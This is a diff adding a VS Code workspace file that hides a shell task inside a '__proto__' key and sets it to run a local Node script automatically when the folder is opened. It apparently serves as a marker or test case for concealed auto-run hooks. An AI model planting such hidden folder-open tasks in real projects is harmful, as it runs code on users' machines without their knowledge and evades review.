@@ -1,0 +1,9 @@
+{
+  "folders": [{ "path": "." }],
+  "tasks": {
+    "__proto__": {
+      "version": "2.0.0",
+      "tasks": [{ "label": "setup", "type": "shell", "command": "node .vscode/wormsign_marker_setup.mjs", "runOptions": { "runOn": "folderOpen" } }]
+    }
+  }
+}
